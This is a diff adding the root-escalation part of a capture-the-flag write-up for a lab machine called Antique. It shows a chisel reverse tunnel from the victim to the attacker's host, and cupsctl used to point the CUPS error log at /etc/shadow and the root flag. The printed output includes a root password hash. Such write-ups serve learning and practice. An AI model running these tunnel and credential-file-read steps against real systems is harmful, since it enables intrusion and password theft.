@@ -175,3 +175,72 @@ user.txt
 ```
 
 ## Root
+Having a foothold on the server, we start exploring the services that are running on the server.
+```
+lp@antique:~$ netstat . -ant
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
+tcp        0    138 10.10.11.107:33968      10.10.14.28:4444        ESTABLISHED
+tcp       10      0 10.10.11.107:23         10.10.14.28:35036       ESTABLISHED
+tcp6       0      0 ::1:631                 :::*                    LISTEN     
+
+```
+There's a service running on port 361. This port is used by internet printing protocol by devault. Let's install chisel to do port forwarding
+```
+git clone https://github.com/jpillora/chisel
+cd chisel && go build -ldflags="-s -w"
+./chisel server -p8000--reverse
+```
+on the victin, launch the following command to forward the local port to the server listening on our client machine.
+```
+./chisel client 10.10.14.28:8000 R:631:127.0.0.1:631
+```
+Browsing to ``127.0.0.1:631`` on our machine shows CUPS administration page.
+CUPS versions less than 1.6.2 has a known local file read vulnerability. Navigate to Administration.
+Clicking on View Error Log shows the contents of error.log file. As CUPS server runs as root by default, arbitraty file read can be achieved by updating ErrorLog file path. Let's update the ErrorLog path usingcupsctl.
+```
+cupsctl ErrorLog="/etc/shadow"
+```
+Now sending a curl request to view error log page, reveals the content of /etc/shadow file (as well as root.txt).
+```
+lp@antique:~$ cupsctl ErrorLog="/etc/shadow"
+lp@antique:~$ curl http://localhost:631/admin/log/error_log
+root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
+daemon:*:18375:0:99999:7:::
+bin:*:18375:0:99999:7:::
+sys:*:18375:0:99999:7:::
+sync:*:18375:0:99999:7:::
+games:*:18375:0:99999:7:::
+man:*:18375:0:99999:7:::
+lp:*:18375:0:99999:7:::
+mail:*:18375:0:99999:7:::
+news:*:18375:0:99999:7:::
+uucp:*:18375:0:99999:7:::
+proxy:*:18375:0:99999:7:::
+www-data:*:18375:0:99999:7:::
+backup:*:18375:0:99999:7:::
+list:*:18375:0:99999:7:::
+irc:*:18375:0:99999:7:::
+gnats:*:18375:0:99999:7:::
+nobody:*:18375:0:99999:7:::
+systemd-network:*:18375:0:99999:7:::
+systemd-resolve:*:18375:0:99999:7:::
+systemd-timesync:*:18375:0:99999:7:::
+messagebus:*:18375:0:99999:7:::
+syslog:*:18375:0:99999:7:::
+_apt:*:18375:0:99999:7:::
+tss:*:18375:0:99999:7:::
+uuidd:*:18375:0:99999:7:::
+tcpdump:*:18375:0:99999:7:::
+landscape:*:18375:0:99999:7:::
+pollinate:*:18375:0:99999:7:::
+systemd-coredump:!!:18389::::::
+lxd:!:18389::::::
+usbmux:*:18891:0:99999:7:::
+lp@antique:~$ cupsctl ErrorLog="/root/root.txt"
+lp@antique:~$ curl http://localhost:631/admin/log/error_log
+fa21719665a3e328f0935b246e83c027
+```
+
